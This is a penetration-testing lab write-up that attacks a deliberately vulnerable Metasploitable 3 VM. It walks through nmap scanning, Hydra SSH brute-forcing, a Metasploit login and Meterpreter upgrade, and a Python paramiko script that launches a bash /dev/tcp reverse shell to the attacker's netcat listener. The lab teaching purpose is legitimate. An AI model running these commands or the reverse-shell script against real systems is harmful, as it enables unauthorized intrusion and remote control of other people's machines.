
#  Phase 1: Exploitation and Reverse Shell

## Lab Setup & Connectivity Check

### Virtual Machines Used
| Role         | OS                 | IP Address         |
|--------------|--------------------|--------------------|
| Attacker     | Kali Linux         | 192.168.142.129    |
| Victim       | Metasploitable 3   | 192.168.142.131    |


####  Attacker ➜ Victim
```bash
ping 192.168.142.131
```
<img src="https://github.com/user-attachments/assets/73da16f9-f226-4db0-b2b3-a9234ee43dc8" width="800"/>

####  Victim ➜ Attacker
```bash
ping 192.168.142.129
```
<img src="https://github.com/user-attachments/assets/950323b3-59ba-4e8d-a9ce-52460545e293" width="800"/>

 The successful replies confirm two-way communication, which is a prerequisite for all following exploitation attempts.

---

##  Task 1.1: Compromise the Target Using Metasploit

###  Objective
Leverage known weak credentials to gain unauthorized access to the victim via SSH and establish a Meterpreter session for post-exploitation control.

### Step-by-Step Breakdown:

#### 1. Reconnaissance with Nmap
```bash
nmap -sV -p- 192.168.142.131
```
<img src="https://github.com/user-attachments/assets/49b83e0a-cf98-49e4-b86a-e7f53381f40d" width="800"/>

 **Why?** Scanning all ports (`-p-`) ensures no open services are missed. Service detection (`-sV`) reveals detailed version info—critical for identifying vulnerabilities.

- Result: Port 22 is open and running OpenSSH 6.6.1p1, a service often attacked via brute-force if weak credentials exist.
- 
![Screenshot 2025-05-05 220016](https://github.com/user-attachments/assets/08079eea-de46-4efc-9fb7-63d1eb62d97d)

**Why it matters ?**
Normally, after a few failed login attempts, SSH closes the connection. But with this flaw, an attacker can send many password guesses in a single session speeding up brute-force attacks.

**Impact ?**
OpenSSH 6.6.1p1 does not restrict the list of keyboard-interactive devices, so this version is vulnerable. /n
Brute-force tools like Hydra become more effective.

#### 2. Credential Brute-Forcing with Hydra
```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131
```
<img src="https://github.com/user-attachments/assets/6ee6884e-569b-4013-b543-28b949035cfe" width="800"/>

 **Why?** Hydra is a powerful tool for performing dictionary attacks on network services like SSH. Using common usernames and passwords helps simulate real-world attacks.

- Success: Discovered `vagrant:vagrant` credentials.

#### 3. Exploiting SSH with Metasploit
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.142.131
set USERNAME vagrant
set PASSWORD vagrant
run
```
<img src="https://github.com/user-attachments/assets/805f1eb1-15f3-4580-9845-f7b70a1f24e7" width="800"/>
<img src="https://github.com/user-attachments/assets/4ad08960-3503-42d4-b984-8c7b5a21ac9e" width="800"/>

 **Why?** This Metasploit module attempts to login using supplied credentials. A successful login gives us shell access over SSH.

#### 4. Upgrading to Meterpreter
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions
sessions 2
shell
```
<img src="https://github.com/user-attachments/assets/84dc529f-e7a7-4458-a8ff-12f9a80a8d15" width="800"/>
<img src="https://github.com/user-attachments/assets/70e3dd0d-61f7-41d5-b7f3-6b5e7b1061a0" width="800"/>
<img src="https://github.com/user-attachments/assets/e355856b-ba2f-4a39-b99e-abad6ca37f2b" width="800"/>



 **Why?** Meterpreter provides advanced post-exploitation features such as file system interaction, privilege escalation, and keylogging. Upgrading from a basic shell enhances our control.

---

##  Task 1.2: Reverse Shell via Custom Python Script

###  Objective
Demonstrate manual exploitation without Metasploit, using Python to log in via SSH and trigger a reverse shell to the attacker.

### Why Paramiko?
Paramiko is a Python library that supports SSH protocol handling. It enables us to automate login and command execution on remote servers.

### Python Script Execution Screenshot
<img src="https://github.com/user-attachments/assets/64fe5eb6-a283-4036-a687-d16b3b3987b7" width="800"/>

### Script: `ssh_bruteforce_reverse.py`
```python
import paramiko

target_ip = "192.168.142.131"
username = "vagrant"
password = "vagrant"
lhost = "192.168.142.129"
lport = "4444"
payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(target_ip, username=username, password=password)
client.exec_command(payload)
client.close()
```

 **Why this payload?**
- `bash -i` creates an interactive shell.
- `/dev/tcp/...` uses Bash's TCP redirection feature to send input/output to the attacker's IP and port.

### Setting up Netcat Listener
```bash
nc -lvnp 4444
```
<img src="https://github.com/user-attachments/assets/c980584d-64bb-4fce-a2db-7005d5083a9d" width="800"/>
<img src="https://github.com/user-attachments/assets/a0452dd1-0094-4592-8e98-73079a36a9bd" width="800"/>

 Once the victim executes the reverse shell command, a new connection is received in Netcat, granting the attacker control.

---

##  Conclusion

This phase demonstrates the full exploitation lifecycle:
- Discovery of vulnerable services
- Credential brute-forcing
- Gaining shell access via Metasploit and custom scripts
- Establishing interactive control using Meterpreter and reverse shells

 **Learning Outcome:** Understanding how common misconfigurations (like weak SSH credentials) can be leveraged in real-world attacks, and practicing both automated and manual exploitation techniques.

